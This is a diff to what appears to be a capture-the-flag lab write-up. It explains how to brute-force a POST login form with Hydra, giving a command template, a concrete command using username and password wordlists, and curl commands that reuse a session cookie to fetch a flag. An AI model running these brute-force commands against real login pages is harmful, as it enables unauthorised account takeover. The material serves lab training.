@@ -4,7 +4,7 @@
 
 ## How Login Forms Work
 
-Browser submits credentials as a POST request with form-encoded body:
+When you click "Login," the browser sends a POST request with the credentials in the body:
 
 ```
 POST /login HTTP/1.1
@@ -15,9 +15,9 @@ username=john&password=secret123
 ```
 
 **What you need before running Hydra:**
-1. The path the form submits to (check `action=` in the HTML, or Network tab in DevTools)
-2. The parameter names (`name=` on each input field)
-3. A failure string (what the page says on bad login) or success condition (redirect code, keyword)
+1. The path the form sends to — check the `action=` attribute in the HTML, or watch the Network tab in DevTools
+2. The parameter names — check the `name=` attribute on each input field
+3. A failure string (what the page says on a bad login) or a success condition (a redirect code or a keyword)
 
 ---
 
@@ -36,6 +36,7 @@ username=john&password=secret123
 ```bash
 hydra -L users.txt -P passwords.txt TARGET -s PORT http-post-form "PATH:PARAMS:CONDITION"
 ```
+> Generic template for attacking a POST login form. Replace `TARGET`, `PORT`, `PATH`, `PARAMS`, and `CONDITION` with values from your recon. `-L` takes a username wordlist; `-P` takes a password wordlist.
 
 ### Condition String
 
@@ -74,6 +75,7 @@ hydra -L ~/SecLists/Usernames/top-usernames-shortlist.txt \
       -f TARGET_IP -s TARGET_PORT \
       http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
 ```
+> Brute-forces the login form at `/`. `^USER^` and `^PASS^` are replaced with each wordlist candidate per attempt. `F=Invalid credentials` flags a failed login. Replace `TARGET_IP`, `TARGET_PORT`, the field names, and the failure string to match your target.
 
 **Why `-f`:** Stops on first valid pair — avoids unnecessary attempts and lockout risk.
 
@@ -98,8 +100,9 @@ curl -s -X POST http://TARGET_IP:TARGET_PORT/ \
 # GET the flag page using the session cookie
 curl -s -b /tmp/cookies.txt http://TARGET_IP:TARGET_PORT/success
 ```
+> Two-step flag retrieval. The first curl logs in and saves the session cookie to `/tmp/cookies.txt`. The second curl uses that cookie to access the authenticated `/success` page. Replace the credentials, IP, port, and paths with your target's values.
 
-**Why `-c` and `-b`:** `-c` saves the session cookie to a file; `-b` sends it back on the next request — mimics what a browser does automatically after login.
+**Why `-c` and `-b`:** `-c` saves the session cookie to a file after login. `-b` sends that cookie back on the next request. Together they mimic what a browser does automatically after you log in.
 
 **Result:**
 ```
